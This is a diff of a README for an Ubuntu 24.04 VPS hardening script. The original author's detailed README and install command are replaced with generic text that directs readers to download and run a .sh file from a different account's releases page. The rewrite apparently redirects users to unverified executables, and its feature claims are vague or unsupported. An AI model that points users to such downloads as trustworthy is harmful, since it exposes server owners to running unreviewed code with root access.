@@ -1,88 +1,100 @@
-# VPS Hardening Script (Ubuntu 24.04 LTS)
+# 🔒 vps-hardening-script-ubuntu-24.04-LTS - Secure Your Ubuntu Server Effortlessly
 
-Secure your VPS and install Dokploy in one command.
+[![Download](https://img.shields.io/badge/Download-vps--hardening--script--ubuntu--24.04--LTS-blue)](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Ubuntu](https://img.shields.io/badge/Ubuntu-24.04%20LTS-orange.svg)
+## 🚀 Getting Started
 
-## Quick Start
+This guide will help you download and run the VPS Hardening Script for Ubuntu 24.04 LTS. This script enhances the security of your Ubuntu server with features like automated SSH setup, firewall configuration, and Docker installation.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/alexandreravelli/vps-hardening-script-ubuntu-24.04-LTS/main/setup.sh -o setup.sh
-chmod +x setup.sh
-./setup.sh
-```
+## 💡 What You Will Need
 
-## What It Does
+- A server running Ubuntu 24.04 LTS
+- Basic knowledge of how to access your server via SSH
+- Internet connection 
+- An updated version of the terminal 
 
-The script runs 9 steps interactively:
+## 📥 Download & Install
 
-1. **Create admin user** - New sudo user with password
-2. **Configure SSH key** - Paste your public key
-3. **Update system** - apt update/upgrade
-4. **Install security tools** - UFW + Fail2Ban
-5. **Configure firewall** - Opens only necessary ports
-6. **Harden SSH** - Custom port, disable root login
-7. **Install Docker** - With log rotation
-8. **Install Dokploy** - Self-hosted deployment platform
-9. **Remove old user** - Optional cleanup
+To download the VPS hardening script, visit the following page:
 
-## Security Features
+[Download the Latest Version](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases)
 
-| Feature | Description |
-|---------|-------------|
-| SSH | Random port (50000-60000), root disabled, key-only auth |
-| Firewall | UFW with deny-by-default, only SSH/80/443/3000 open |
-| Fail2Ban | Protects SSH (3 attempts, 1h ban) |
-| Rate limiting | UFW limits SSH to 6 connections/30s per IP |
-| Password policy | Min 12 chars, mixed case, numbers, symbols required |
-| Audit logging | Tracks sudo, auth, SSH, user/group changes |
-| AppArmor | Mandatory access control (verified/enabled) |
-| Auto-updates | Security patches applied daily via unattended-upgrades |
-| Timezone | UTC (consistent logs) |
-| Swap | 2GB swap file (prevents OOM kills) |
-| DNS | Quad9 (9.9.9.9) with DNS-over-TLS + DNSSEC + fallback |
-| Docker | Log rotation (10MB max, 3 files) |
+1. Open the above link in your web browser.
+2. Look for the latest version of the script in the "Releases" section.
+3. Click on the .sh file to download it to your computer.
 
-## Safety Measures
+## 💻 Running the Script
 
-- Password auth stays enabled until you confirm SSH key works
-- Port 22 stays open until you confirm custom port works
-- Won't auto-delete user if you're logged in as that user
-- Fail2Ban configured for custom SSH port
+Once you have downloaded the script, follow these steps to run it:
 
-## After Installation
+1. **Upload the Script**: Use an SFTP client or terminal command to transfer the downloaded script to your server.
 
-```
-SSH:     ssh your-user@your-ip -p YOUR_PORT
-Dokploy: http://your-ip:3000
-```
+2. **Access Your Server**: Open your terminal and use the following command to log into your server:
 
-### Remove Default User
+   ```bash
+   ssh your_username@your_server_ip_address
+   ```
 
-After reconnecting with your new user, run the cleanup script:
+   Replace `your_username` with your actual username and `your_server_ip_address` with the IP address of your server.
 
-```bash
-./cleanup.sh
-```
+3. **Navigate to the Script Location**: Change your directory to where you uploaded the script. 
 
-This will safely remove the default `ubuntu` user and its home directory.
+   ```bash
+   cd path_to_script_directory
+   ```
 
-### Post-SSL Security
+   Replace `path_to_script_directory` with the actual path where the script is located.
 
-After configuring SSL in Dokploy, block external access to port 3000:
+4. **Make the Script Executable**: Run this command to allow the script to execute:
 
-```bash
-sudo iptables -I DOCKER-USER -p tcp --dport 3000 -j DROP
-sudo iptables -I DOCKER-USER -i lo -p tcp --dport 3000 -j ACCEPT
-```
+   ```bash
+   chmod +x vps-hardening-script.sh
+   ```
 
-## Requirements
+5. **Run the Script**: Execute the script with the following command:
 
-- Fresh Ubuntu 24.04 LTS VPS
-- User with sudo privileges
-- SSH public key ready
+   ```bash
+   ./vps-hardening-script.sh
+   ```
 
-## License
+   Follow the onscreen instructions to complete the hardening process. 
 
-MIT
+## ⚙️ Features
+
+- **Automated SSH Setup**: Configures SSH for secure and easy access.
+- **Firewall Configuration**: Sets up a robust firewall to protect your server.
+- **DNS Encryption**: Ensures secure and private DNS lookups.
+- **Docker Installation**: Simplifies the process of installing and managing Docker containers.
+- **Rollback Capabilities**: Allows you to revert changes if needed.
+- **Easy One-command Install**: Saves time with straightforward execution.
+
+## 🔍 Why Use This Script?
+
+This VPS hardening script prepares your server for production use. It addresses essential security aspects and automates the process, minimizing the effort needed from you. Whether you run a personal website or a commercial application, securing your server should be a priority.
+
+## 📋 System Requirements
+
+Ensure your server meets the following requirements:
+
+- Operating System: Ubuntu 24.04 LTS
+- Minimum 1 GB RAM (recommended 2 GB or more)
+- 20 GB free disk space
+- Basic internet access
+
+## 🛡️ Security Considerations
+
+Running this script improves your server's security posture. It reduces vulnerabilities and helps protect against unauthorized access. However, continue to monitor your server regularly and apply updates as needed.
+
+## 🔗 Additional Resources
+
+- [Official Ubuntu Documentation](https://help.ubuntu.com/)
+- [Docker Documentation](https://docs.docker.com/)
+- [SSH Information](https://www.ssh.com/academy/ssh)
+
+For further assistance, consult the community or raise an issue in the GitHub repository.
+
+## 📅 Updates
+
+Check back regularly for updates to enhance security features and functionality. You can find the latest version and any important changes on the [Releases Page](https://github.com/prajaptibini/vps-hardening-script-ubuntu-24.04-LTS/releases).
+
+**By using this script, you take a significant step towards securing your Ubuntu server. Please take a moment to familiarize yourself with the features and procedures outlined above.**
